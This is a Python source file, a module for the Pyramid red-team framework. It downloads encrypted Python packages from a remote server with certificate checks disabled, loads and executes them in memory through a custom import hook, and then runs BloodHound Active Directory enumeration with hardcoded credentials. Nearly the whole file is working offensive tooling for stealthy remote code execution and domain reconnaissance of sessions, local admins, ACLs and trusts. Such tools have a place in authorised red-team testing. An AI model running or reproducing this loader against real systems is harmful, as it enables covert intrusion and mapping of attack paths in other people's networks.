'''
Author: @naksyn (c) 2022

Update 04-2023: @naksyn - bumped to work with Pyramid v.0.1

Description: Pyramid module for py-bloodhound

Credits:
 - https://github.com/fox-it/BloodHound.py

-
Copyright 2022 naksyn
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"),
to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, 
DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE 
OR THE USE OR OTHER DEAL
'''

import os
import base64
import ssl
import importlib
import zipfile
import urllib.request
import sys
import io
import time
import logging
import ctypes
import inspect

### AUTO-GENERATED PYRAMID CONFIG ### DELIMITER

pyramid_server='192.168.1.2'
pyramid_port='80'
pyramid_user='test'
pyramid_pass='pass'
encryption='chacha20'
encryptionpass='chacha20'
chacha20IV=b'12345678'
pyramid_http='http'
encode_encrypt_url='/login/'

### END DELIMITER


###### CHANGE THIS BLOCK ##########

### GENERAL CONFIG ####

user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'

### Directory to which extract pyds dependencies (crypto, paramiko etc.) - can also be a Network Share e.g. \\\\share\\folder
### setting to false extract to current directory
extraction_dir=False 

### BLOODHOUND CONFIG

username_bh="ADuser"
password_bh="Password1!"
domain_bh="test.local"
domain_controller=False # False = auto-detection
global_catalog=False # False = auto-detection
param_nameserver=False # False = auto-detection


#### DO NOT CHANGE BELOW THIS LINE #####


### ChaCha encryption

def yield_chacha20_xor_stream(key, iv, position=0):
  """Generate the xor stream with the ChaCha20 cipher."""
  if not isinstance(position, int):
    raise TypeError
  if position & ~0xffffffff:
    raise ValueError('Position is not uint32.')
  if not isinstance(key, bytes):
    raise TypeError
  if not isinstance(iv, bytes):
    raise TypeError
  if len(key) != 32:
    raise ValueError
  if len(iv) != 8:
    raise ValueError

  def rotate(v, c):
    return ((v << c) & 0xffffffff) | v >> (32 - c)

  def quarter_round(x, a, b, c, d):
    x[a] = (x[a] + x[b]) & 0xffffffff
    x[d] = rotate(x[d] ^ x[a], 16)
    x[c] = (x[c] + x[d]) & 0xffffffff
    x[b] = rotate(x[b] ^ x[c], 12)
    x[a] = (x[a] + x[b]) & 0xffffffff
    x[d] = rotate(x[d] ^ x[a], 8)
    x[c] = (x[c] + x[d]) & 0xffffffff
    x[b] = rotate(x[b] ^ x[c], 7)

  ctx = [0] * 16
  ctx[:4] = (1634760805, 857760878, 2036477234, 1797285236)
  ctx[4 : 12] = struct.unpack('<8L', key)
  ctx[12] = ctx[13] = position
  ctx[14 : 16] = struct.unpack('<LL', iv)
  while 1:
    x = list(ctx)
    for i in range(3):
      quarter_round(x, 0, 4,  8, 12)
      quarter_round(x, 1, 5,  9, 13)
      quarter_round(x, 2, 6, 10, 14)
      quarter_round(x, 3, 7, 11, 15)
      quarter_round(x, 0, 5, 10, 15)
      quarter_round(x, 1, 6, 11, 12)
      quarter_round(x, 2, 7,  8, 13)
      quarter_round(x, 3, 4,  9, 14)
    for c in struct.pack('<16L', *(
        (x[i] + ctx[i]) & 0xffffffff for i in range(16))):
      yield c
    ctx[12] = (ctx[12] + 1) & 0xffffffff
    if ctx[12] == 0:
      ctx[13] = (ctx[13] + 1) & 0xffffffff


def encrypt_chacha20(data, key, iv=None, position=0):
  """Encrypt (or decrypt) with the ChaCha20 cipher."""
  if not isinstance(data, bytes):
    raise TypeError
  if iv is None:
    iv = b'\0' * 8
  if isinstance(key, bytes):
    if not key:
      raise ValueError('Key is empty.')
    if len(key) < 32:
      # TODO(pts): Do key derivation with PBKDF2 or something similar.
      key = (key * (32 // len(key) + 1))[:32]
    if len(key) > 32:
      raise ValueError('Key too long.')

  return bytes(a ^ b for a, b in
      zip(data, yield_chacha20_xor_stream(key, iv, position)))

### XOR encryption

def encrypt(data, key):
    xored_data = []
    i = 0
    for data_byte in data:
        if i < len(key):
            xored_byte = data_byte ^ key[i]
            xored_data.append(xored_byte)
            i += 1
        else:
            xored_byte = data_byte ^ key[0]
            xored_data.append(xored_byte)
            i = 1
    return bytes(xored_data)


### Encryption wrapper ####

def encrypt_wrapper(data, encryption):
    if encryption == 'xor':
        result=encrypt(data, encryptionpass.encode())
        return result
    elif encryption == 'chacha20':
        result=encrypt_chacha20(data, encryptionpass.encode(),chacha20IV)
        return result		


cwd=os.getcwd()

if not extraction_dir:
	extraction_dir=cwd
	
sys.path.insert(1,extraction_dir)

zip_name='bloodhound---Cryptodome'

print("[*] Downloading and unpacking on disk Cryptodome pyds dependencies on dir {}".format(extraction_dir))
gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
gcontext.check_hostname = False
gcontext.verify_mode = ssl.CERT_NONE
request = urllib.request.Request(pyramid_http + '://'+ pyramid_server + ':' + pyramid_port + encode_encrypt_url + \
          base64.b64encode((encrypt_wrapper((zip_name+'.zip').encode(), encryption))).decode('utf-8'), \
          headers={'User-Agent': user_agent})
base64string = base64.b64encode(bytes('%s:%s' % (pyramid_user, pyramid_pass),'ascii'))
request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
with urllib.request.urlopen(request, context=gcontext) as response:
   zip_web = response.read()

print("[*] Decrypting received file")   
zip_web= encrypt_wrapper(zip_web, encryption)

with zipfile.ZipFile(io.BytesIO(zip_web), 'r') as zip_ref:
    zip_ref.extractall(extraction_dir)
        

import Cryptodome   

#### MODULE IMPORTER ####

moduleRepo = {}
_meta_cache = {}


_search_order = [('.py', False), ('/__init__.py', True)]

class ZipImportError(ImportError):
	"""Exception raised by zipimporter objects."""

class CFinder(object):
	"""Import Hook"""
	def __init__(self, repoName):
		self.repoName = repoName
		self._source_cache = {}

	def _get_info(self, fullname):
		"""Search for the respective package or module in the zipfile object"""
		parts = fullname.split('.')
		submodule = parts[-1]
		modulepath = '/'.join(parts)

		#check to see if that specific module exists

		for suffix, is_package in _search_order:
			relpath = modulepath + suffix
			try:
				moduleRepo[self.repoName].getinfo(relpath)
			except KeyError:
				pass
			else:
				return submodule, is_package, relpath

		#Error out if we can find the module/package
		msg = ('Unable to locate module %s in the %s repo' % (submodule, self.repoName))
		raise ZipImportError(msg)

	def _get_source(self, fullname):
		"""Get the source code for the requested module"""
		submodule, is_package, relpath = self._get_info(fullname)
		fullpath = '%s/%s' % (self.repoName, relpath)
		if relpath in self._source_cache:
			source = self._source_cache[relpath]
			return submodule, is_package, fullpath, source
		try:
			### added .decode
			source =  moduleRepo[self.repoName].read(relpath).decode()
			#print(source)
			source = source.replace('\r\n', '\n')
			source = source.replace('\r', '\n')
			self._source_cache[relpath] = source
			return submodule, is_package, fullpath, source
		except:
			raise ZipImportError("Unable to obtain source for module %s" % (fullpath))

	def find_spec(self, fullname, path=None, target=None):
		try:
			submodule, is_package, relpath = self._get_info(fullname)
		except ImportError:
			return None
		else:
			return importlib.util.spec_from_loader(fullname, self)

	def create_module(self, spec):
		return None

	def exec_module(self, module):
		submodule, is_package, fullpath, source = self._get_source(module.__name__)
		code = compile(source, fullpath, 'exec')
		if is_package:
			module.__path__ = [os.path.dirname(fullpath)]
		exec(code, module.__dict__)

	def get_data(self, fullpath):

		prefix = os.path.join(self.repoName, '')
		if not fullpath.startswith(prefix):
			raise IOError('Path %r does not start with module name %r', (fullpath, prefix))
		relpath = fullpath[len(prefix):]
		try:
			return moduleRepo[self.repoName].read(relpath)
		except KeyError:
			raise IOError('Path %r not found in repo %r' % (relpath, self.repoName))

	def is_package(self, fullname):
		"""Return if the module is a package"""
		submodule, is_package, relpath = self._get_info(fullname)
		return is_package

	def get_code(self, fullname):
		submodule, is_package, fullpath, source = self._get_source(fullname)
		return compile(source, fullpath, 'exec')

def install_hook(repoName):
	if repoName not in _meta_cache:
		finder = CFinder(repoName)
		_meta_cache[repoName] = finder
		sys.meta_path.append(finder)

def remove_hook(repoName):
	if repoName in _meta_cache:
		finder = _meta_cache.pop(repoName)
		sys.meta_path.remove(finder)

def hook_routine(fileName,zip_web):
	zf=zipfile.ZipFile(io.BytesIO(zip_web), 'r')
	moduleRepo[fileName]=zf
	install_hook(fileName)
	
### separator --- is used by Pyramid server to look into the specified dependency folder
	
zip_list=['bloodhound---setuptools', 'bloodhound---pkg_resources', 'bloodhound---jaraco', 'bloodhound---_distutils_hack', 'bloodhound---bloodhound', 'bloodhound---distutils',\
 'bloodhound---configparser', 'bloodhound---future', 'bloodhound---chardet', 'bloodhound---flask', 'bloodhound---ldap3', 'bloodhound---ldapdomaindump', \
 'bloodhound---pyasn1', 'bloodhound---OpenSSL','bloodhound---pyreadline', 'bloodhound---six','bloodhound---markupsafe', 'bloodhound---werkzeug','bloodhound---jinja2',\
 'bloodhound---click', 'bloodhound---itsdangerous', 'bloodhound---dns', 'bloodhound---cryptography', 'bloodhound---json', 'bloodhound---impacket', 'bloodhound--winkerberos' ]
	
for zip_name in zip_list:
    try:
        print("[*] Loading in memory module package: " + zip_name)
        gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        gcontext.check_hostname = False
        gcontext.verify_mode = ssl.CERT_NONE
        request = urllib.request.Request(pyramid_http + '://'+ pyramid_server + ':' + pyramid_port + encode_encrypt_url + \
                  base64.b64encode((encrypt_wrapper((zip_name+'.zip').encode(), encryption))).decode('utf-8'), \
				  headers={'User-Agent': user_agent})
				  
        base64string = base64.b64encode(bytes('%s:%s' % (pyramid_user, pyramid_pass),'ascii'))
        request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
        with urllib.request.urlopen(request, context=gcontext) as response:
            zip_web = response.read()
            print("[*] Decrypting received file") 
            zip_web= encrypt_wrapper(zip_web,encryption)
            hook_routine(zip_name, zip_web)

    except Exception as e:
        print(e)
	
import Cryptodome	

print("[*] Modules imported")
print("[*] Executing BloodHound")

try:
	import os, sys, logging, argparse, getpass, time, re, datetime
	from zipfile import ZipFile
	from bloodhound.ad.domain import AD, ADDC
	from bloodhound.ad.authentication import ADAuthentication
	from bloodhound.enumeration.computers import ComputerEnumerator
	from bloodhound.enumeration.memberships import MembershipEnumerator
	from bloodhound.enumeration.domains import DomainEnumerator
except:
	logging.exception('Got exception on import')
"""
BloodHound.py is a Python port of BloodHound, designed to run on Linux and Windows.
"""
class BloodHound(object):
    def __init__(self, ad):
        self.ad = ad
        self.ldap = None
        self.pdc = None
        self.sessions = []


    def connect(self):
        if len(self.ad.dcs()) == 0:
            logging.error('Could not find a domain controller. Consider specifying a domain and/or DNS server.')
            #sys.exit(1)

        if not self.ad.baseDN:
            logging.error('Could not figure out the domain to query. Please specify this manualy with -d')
            #sys.exit(1)

        pdc = self.ad.dcs()[0]
        logging.debug('Using LDAP server: %s', pdc)
        logging.debug('Using base DN: %s', self.ad.baseDN)

        if len(self.ad.kdcs()) > 0:
            kdc = self.ad.kdcs()[0]
            logging.debug('Using kerberos KDC: %s', kdc)
            logging.debug('Using kerberos realm: %s', self.ad.realm())

        # Create a domain controller object
        self.pdc = ADDC(pdc, self.ad)
        # Create an object resolver
        self.ad.create_objectresolver(self.pdc)
#        self.pdc.ldap_connect(self.ad.auth.username, self.ad.auth.password, kdc)


    def run(self, collect, num_workers=10, disable_pooling=False, timestamp = ""):
        start_time = time.time()
        if 'group' in collect or 'objectprops' in collect or 'acl' in collect:
            # Fetch domains/computers for later
            self.pdc.prefetch_info('objectprops' in collect, 'acl' in collect)
            # Initialize enumerator
            membership_enum = MembershipEnumerator(self.ad, self.pdc, collect, disable_pooling)
            membership_enum.enumerate_memberships(timestamp=timestamp)
        elif any(method in collect for method in ['localadmin', 'session', 'loggedon', 'experimental', 'rdp', 'dcom', 'psremote']):
            # We need to know which computers to query regardless
            # We also need the domains to have a mapping from NETBIOS -> FQDN for local admins
            self.pdc.prefetch_info('objectprops' in collect, 'acl' in collect)
        elif 'trusts' in collect:
            # Prefetch domains
            self.pdc.get_domains('acl' in collect)
        if 'trusts' in collect or 'acl' in collect or 'objectprops' in collect:
            trusts_enum = DomainEnumerator(self.ad, self.pdc)
            trusts_enum.dump_domain(collect,timestamp=timestamp)
        if 'localadmin' in collect or 'session' in collect or 'loggedon' in collect or 'experimental' in collect:
            # If we don't have a GC server, don't use it for deconflictation
            have_gc = len(self.ad.gcs()) > 0
            computer_enum = ComputerEnumerator(self.ad, self.pdc, collect, do_gc_lookup=have_gc)
            computer_enum.enumerate_computers(self.ad.computers, num_workers=num_workers, timestamp=timestamp)
        end_time = time.time()
        minutes, seconds = divmod(int(end_time-start_time),60)
        logging.info('Done in %02dM %02dS' % (minutes, seconds))


def kerberize():
    # If the kerberos credential cache is known, use that.
    krb5cc = os.getenv('KRB5CCNAME')

    # Otherwise, guess it.
    if krb5cc is None:
        krb5cc = '/tmp/krb5cc_%u' % os.getuid()

    if os.path.isfile(krb5cc):
        logging.debug('Using kerberos credential cache: %s', krb5cc)
        if os.getenv('KRB5CCNAME') is None:
            os.environ['KRB5CCNAME'] = krb5cc
    else:
        logging.error('Could not find kerberos credential cache file')
        #sys.exit(1)

def resolve_collection_methods(methods):
    """
    Convert methods (string) to list of validated methods to resolve
    """
    valid_methods = ['group', 'localadmin', 'session', 'trusts', 'default', 'all', 'loggedon',
                     'objectprops', 'experimental', 'acl', 'dcom', 'rdp', 'psremote', 'dconly']
    default_methods = ['group', 'localadmin', 'session', 'trusts']
    # Similar to SharpHound, All is not really all, it excludes loggedon
    all_methods = ['group', 'localadmin', 'session', 'trusts', 'objectprops', 'acl', 'dcom', 'rdp', 'psremote']
    # DC only, does not collect to computers
    dconly_methods = ['group', 'trusts', 'objectprops', 'acl']
    if ',' in methods:
        method_list = [method.lower() for method in methods.split(',')]
        validated_methods = []
        for method in method_list:
            if method not in valid_methods:
                logging.error('Invalid collection method specified: %s', method)
                return False

            if method == 'default':
                validated_methods += default_methods
            elif method == 'all':
                validated_methods += all_methods
            elif method == 'dconly':
                validated_methods += dconly_methods
            else:
                validated_methods.append(method)
        return set(validated_methods)
    else:
        validated_methods = []
        # It is only one
        method = methods.lower()
        if method in valid_methods:
            if method == 'default':
                validated_methods += default_methods
            elif method == 'all':
                validated_methods += all_methods
            elif method == 'dconly':
                validated_methods += dconly_methods
            else:
                validated_methods.append(method)
            return set(validated_methods)
        else:
            logging.error('Invalid collection method specified: %s', method)
            return False

def main():
#    logging.basicConfig(stream=sys.stderr, level=logging.INFO)

    logger = logging.getLogger()
    logger.setLevel(logging.INFO)
    stream = logging.StreamHandler(sys.stderr)
    stream.setLevel(logging.DEBUG)
    formatter = logging.Formatter('%(levelname)s: %(message)s')
#    formatter = logging.Formatter('%(asctime)s %(levelname)s: %(message)s')
    stream.setFormatter(formatter)
    logger.addHandler(stream)

    parser = argparse.ArgumentParser(add_help=True, description='Python based ingestor for BloodHound\nFor help or reporting issues, visit https://github.com/Fox-IT/BloodHound.py', formatter_class=argparse.RawDescriptionHelpFormatter)

    parser.add_argument('-c',
                        '--collectionmethod',
                        action='store',
                        default='Default',
                        help='Which information to collect. Supported: Group, LocalAdmin, Session, '
                             'Trusts, Default (all previous), DCOnly (no computer connections), DCOM, RDP,'
                             'PSRemote, LoggedOn, ObjectProps, ACL, All (all except LoggedOn). '
                             'You can specify more than one by separating them with a comma. (default: Default)')
    parser.add_argument('-u',
                        '--username',
                        action='store',
                        help='Username. Format: username[@domain]; If the domain is unspecified, the current domain is used.')
    parser.add_argument('-p',
                        '--password',
                        action='store',
                        help='Password')
    parser.add_argument('-k',
                        '--kerberos',
                        action='store_true',
                        help='Use kerberos')
    parser.add_argument('--hashes',
                        action='store',
                        help='LM:NLTM hashes')
    parser.add_argument('-ns',
                        '--nameserver',
                        action='store',
                        help='Alternative name server to use for queries')
    parser.add_argument('--dns-tcp',
                        action='store_true',
                        help='Use TCP instead of UDP for DNS queries')
    parser.add_argument('--dns-timeout',
                        action='store',
                        type=int,
                        default=3,
                        help='DNS query timeout in seconds (default: 3)')
    parser.add_argument('-d',
                        '--domain',
                        action='store',
                        help='Domain to query.')
    parser.add_argument('-dc',
                        '--domain-controller',
                        metavar='HOST',
                        action='store',
                        help='Override which DC to query (hostname)')
    parser.add_argument('-gc',
                        '--global-catalog',
                        metavar='HOST',
                        action='store',
                        help='Override which GC to query (hostname)')
    parser.add_argument('-w',
                        '--workers',
                        action='store',
                        type=int,
                        default=10,
                        help='Number of workers for computer enumeration (default: 10)')
    parser.add_argument('-v',
                        action='store_true',
                        help='Enable verbose output')
    parser.add_argument('--disable-pooling',
                        action='store_true',
                        help='Don\'t use subprocesses for ACL parsing (only for debugging purposes)')
    parser.add_argument('--disable-autogc',
                        action='store_true',
                        help='Don\'t automatically select a Global Catalog (use only if it gives errors)')
    parser.add_argument('--zip',
                        action='store_true',
                        help='Compress the JSON output files into a zip archive')

    args = parser.parse_args()

    #if args.v is True:
    logger.setLevel(logging.DEBUG)

    '''if args.kerberos is True:
        logging.debug('Authentication: kerberos')
        kerberize()
        auth = ADAuthentication()
    elif args.username is not None and args.password is not None:'''
    logging.debug('Authentication: username/password')
    auth = ADAuthentication(username=username_bh, password=password_bh, domain=domain_bh)
    '''elif args.username is not None and args.password is None and args.hashes is None:
        args.password = getpass.getpass()
        auth = ADAuthentication(username=args.username, password=args.password, domain=args.domain)
    elif args.username is None and (args.password is not None or args.hashes is not None):
        logging.error('Authentication: password or hashes provided without username')
        ##sys.exit(1)
    elif args.hashes is not None and args.username is not None:
        logging.debug('Authentication: NTLM hashes')
        lm, nt = args.hashes.split(":")
        auth = ADAuthentication(lm_hash=lm, nt_hash=nt, username=args.username, domain=args.domain)
    else:
        parser.print_help()
        ##sys.exit(1)
    '''
    ad = AD(auth=auth, domain=args.domain, nameserver=args.nameserver, dns_tcp=args.dns_tcp, dns_timeout=args.dns_timeout)

    # Resolve collection methods
    collect = resolve_collection_methods(args.collectionmethod)
    if not collect:
        return
    logging.debug('Resolved collection methods: %s', ', '.join(list(collect)))

    logging.debug('Using DNS to retrieve domain information')
    ad.dns_resolve(kerberos=args.kerberos, domain=args.domain, options=args)

    # Override the detected DC / GC if specified
    if args.domain_controller:
        if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', args.domain_controller):
            logging.error('The specified domain controller %s looks like an IP address, but requires a hostname (FQDN).\n'\
                          'Use the -ns flag to specify a DNS server IP if the hostname does not resolve on your default nameserver.',
                          args.domain_controller)
            ##sys.exit(1)
        ad.override_dc(args.domain_controller)
    if args.global_catalog:
        if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', args.global_catalog):
            logging.error('The specified global catalog server %s looks like an IP address, but requires a hostname (FQDN).\n'\
                          'Use the -ns flag to specify a DNS server IP if the hostname does not resolve on your default nameserver.',
                          args.global_catalog)
            ##sys.exit(1)
        ad.override_gc(args.global_catalog)
    # For adding timestamp prefix to the outputfiles
    timestamp = datetime.datetime.fromtimestamp(time.time()).strftime('%Y%m%d%H%M%S') + "_"
    bloodhound = BloodHound(ad)
    bloodhound.connect()
    bloodhound.run(collect=collect,
                   num_workers=args.workers,
                   disable_pooling=args.disable_pooling,
                   timestamp=timestamp)
    #If args --zip is true, the compress output
    if args.zip:
        logging.info("Compressing output into " + timestamp + "BH.zip")
        # Get a list of files in the current dir
        list_of_files = os.listdir(os.getcwd())
        # Create handle to zip file with timestamp prefix
        with ZipFile(timestamp + "BH.zip",'w') as zip:
            # For each of those files we fetched
            for each_file in list_of_files:
                # If the files starts with the current timestamp and ends in json
                if each_file.startswith(timestamp) and each_file.endswith("json"):
                    # Write it to the zip
                    zip.write(each_file)
                    # Remove it from disk
                    os.remove(each_file)

    
if __name__ == '__main__':
    main()
    
